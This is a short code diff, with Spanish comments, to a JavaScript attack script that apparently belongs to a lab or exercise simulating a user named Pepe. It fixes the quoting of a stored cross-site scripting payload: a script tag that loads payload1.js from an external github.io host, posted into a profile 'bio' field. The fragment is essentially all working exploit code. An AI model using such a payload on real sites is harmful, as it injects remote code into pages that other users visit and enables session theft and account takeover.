@@ -23,10 +23,12 @@
 
     // Paso 3: preparar los datos del formulario con bio modificada
     const formData = new FormData();
+    const u = "https://scursatonegino16.github.io/payload1.js";
+    const payload = `<script src="${u}"></script>`; // payload es una string válida
+
     formData.append("username", username);
     formData.append("email", email);
-    formData.append("bio", "<script src=""https://scursatonegino16.github.io/payload1.js"></script>
-"");
+    formData.append("bio", payload);
 
     // Paso 4: enviar la petición POST (simula que Pepe actualiza su bio)
     const update = await fetch("/profile", {
